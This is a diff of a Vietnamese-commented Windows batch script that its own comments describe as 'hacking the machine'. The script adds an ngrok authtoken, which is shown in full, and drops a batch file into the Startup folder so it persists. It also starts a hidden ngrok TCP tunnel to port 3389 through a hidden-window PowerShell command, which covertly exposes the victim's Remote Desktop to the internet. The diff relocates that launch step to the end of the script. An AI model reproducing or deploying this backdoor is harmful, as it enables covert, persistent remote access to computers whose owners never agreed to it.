@@ -31,10 +31,7 @@ ngrok.exe >nul 2>&1
 :: Bước 7: Thêm authtoken
 ngrok.exe config add-authtoken 2hlr5hFpZid0dajdFUQvzl6AvL1_4oeHWSyQ78RPdZHRMAY5d
 
-:: Bước 8: Chạy ngrok TCP 3389 và ẩn cửa sổ
-echo Dang khoi dong ngrok (an cua so)...
-powershell -WindowStyle Hidden -Command "Start-Process -FilePath 'C:\DkTX\ngrok.exe' -ArgumentList 'tcp 3389' -WindowStyle Hidden"
-
+:: Bước 8: 
 :: Bước 9: Tải TDMCngrok.bat vào thư mục Startup (shell:startup)
 echo Dang tai TDMCngrok.bat vao Startup...
 
@@ -52,5 +49,7 @@ IF EXIST "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\TDMCngrok.bat"
 :: xong Hack Máy , Máy hết cứu 
 echo cai dat ngrok & chinh sua da xong may het cuu :))
 echo Tu dong thoat trong 10 giay...
-timeout /t 10 >nul
+:: Chạy ngrok TCP 3389 và ẩn cửa sổ
+echo Dang khoi dong ngrok (an cua so)...
+powershell -WindowStyle Hidden -Command "Start-Process -FilePath 'C:\DkTX\ngrok.exe' -ArgumentList 'tcp 3389' -WindowStyle Hidden"
 exit
